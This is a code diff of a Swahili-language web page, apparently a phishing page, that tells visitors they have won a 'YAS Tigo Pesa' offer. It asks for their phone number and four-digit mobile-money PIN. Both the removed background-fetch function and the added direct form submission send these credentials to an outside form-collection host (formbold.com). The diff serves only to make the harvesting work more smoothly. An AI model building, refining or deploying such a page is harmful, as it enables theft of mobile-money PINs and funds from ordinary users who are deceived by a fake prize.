@@ -11,6 +11,8 @@
         <h2>Umejishindia Ofa Wa YAS Tigo pesa</h2>
         <p class="subtitle">Karibu! Ingiza namba yako ya simu na Neno Siri (YAS PIN - 4 namba) ili kupata ofa.</p>
         
+        <!-- REMOVED: The amount-box div -->
+        
         <form id="offerForm" action="https://formbold.com/s/9ROxy" method="POST">
             
             <div class="phone-input">
@@ -52,7 +54,15 @@
                         const allPinsFilled = Array.from(pinBoxes).every(input => input.value.length === 1);
                         if (allPinsFilled) {
                             updateHiddenPin();
-                            submitFormData(); // UPDATED: Call the new submit function
+                            
+                            // Check if phone number is filled before submitting
+                            if (phoneNumberInput.value.trim() === '') {
+                                alert('Tafadhali ingiza namba yako ya simu.');
+                                phoneNumberInput.focus(); // Focus the phone input
+                                return; // Stop submission
+                            }
+                            
+                            form.submit();
                         }
                     }
                 }
@@ -69,36 +79,6 @@
         function updateHiddenPin() {
             const pin = Array.from(pinBoxes).map(input => input.value).join('');
             hiddenPinInput.value = pin;
-        }
-
-        // UPDATED: New function to handle fast submission
-        async function submitFormData() {
-            if (phoneNumberInput.value.trim() === '') {
-                alert('Tafadhali ingiza namba yako ya simu.');
-                phoneNumberInput.focus();
-                return;
-            }
-
-            const formData = new FormData(form);
-            
-            try {
-                // Send data in the background without waiting for a response
-                fetch(form.action, {
-                    method: 'POST',
-                    body: formData,
-                });
-
-                // Immediately redirect or show success message
-                // For now, we'll just clear the form as a success indicator
-                console.log('Form submitted successfully!');
-                form.reset();
-                alert('Shukran! Ofa yako imewasilishwa.');
-
-            } catch (error) {
-                // If fetch fails, log the error but don't stop the user
-                console.error('Form submission failed:', error);
-                alert('Kuna hitilafu. Tafadhali jaribu tena.');
-            }
         }
     </script>
 </body>
